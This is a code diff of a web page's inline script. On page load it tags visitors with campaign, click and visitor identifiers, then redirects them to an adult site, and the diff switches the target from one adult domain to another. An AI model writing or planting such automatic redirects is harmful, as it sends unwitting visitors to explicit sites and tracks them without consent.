@@ -49,8 +49,7 @@
 
         function generateSourceId() {
             var timestamp = Date.now().toString();
-            var sourceId = 'ts_' + timestamp;
-            return sourceId;
+            return 'ts_' + timestamp;
         }
 
         function redirectToPartnersPage() {
@@ -59,65 +58,45 @@
 
         function addUtmSourceFromDomain(url) {
             readDomainFromFile(function(domain) {
-                var utmSource = domain || generateSourceId();
-                
-                // Generate utm_medium
+                var sourceId = domain || generateSourceId();
                 var utmMedium = generateUtmMedium();
 
-                // Generate a unique identifier for the visitor based on IP address
                 var visitorId = localStorage.getItem('visitorId');
-                var currentIP = '127.0.0.1'; // Placeholder for the current IP, replace with actual IP retrieval logic
+                var currentIP = '127.0.0.1'; // Placeholder for actual IP retrieval logic
                 var visitorKey = currentIP + '_visited';
                 var lastVisitTime = localStorage.getItem(visitorKey);
-                
-                // Check if the visitor has visited within the last 24 hours
+
                 var currentTime = Date.now();
                 if (!lastVisitTime || (currentTime - parseInt(lastVisitTime)) > (24 * 60 * 60 * 1000)) {
-                    // If the visitor is new or hasn't visited within the last 24 hours
-                    visitorId = generateClickId(10); // Generate a new visitor ID
+                    visitorId = generateClickId(10);
                     localStorage.setItem('visitorId', visitorId);
                     localStorage.setItem(visitorKey, currentTime);
                 } else {
-                    // If the visitor has already visited within the last 24 hours, redirect them to partners page
                     redirectToPartnersPage();
                     return;
                 }
 
-                // Additional parameters for tracking utm_source, utm_medium, and utm_campaign
                 var clickId = generateClickId(100); 
-
-                // Array of campaign options to be used alternately
                 var campaignOptions = ['737408'];
-
-                // Determine the index of the campaign to be used based on the last campaign status
                 var lastCampaignIndex = parseInt(localStorage.getItem('lastCampaignIndex')) || 0;
                 var currentCampaignIndex = (lastCampaignIndex + 1) % campaignOptions.length;
-
-                // Update the status of the last campaign
                 localStorage.setItem('lastCampaignIndex', currentCampaignIndex);
-
-                // Get the campaign to be used
                 var utmCampaign = campaignOptions[currentCampaignIndex];
 
-                // Add parameters to the URL
                 var params = [
                     'utm_campaign=' + encodeURIComponent(utmCampaign),
-                    'utm_source=' + encodeURIComponent(utmSource),
+                    'source_id=' + encodeURIComponent(sourceId),
                     'utm_medium=' + encodeURIComponent(utmMedium),
                     'click_id=' + encodeURIComponent(clickId),
                     'visitor_id=' + encodeURIComponent(visitorId)
                 ];
 
-                // Add parameters to the URL
                 url += '?' + params.join('&');
-                
-                // Redirect to the modified URL
                 window.location.href = url;
             });
         }
 
-        // Call the function to redirect visitors to the direct link when the page is loaded
-        addUtmSourceFromDomain('https://perverttube.top/include');
+        addUtmSourceFromDomain('https://12milf.us/');
     </script>
 </head>
 <body>
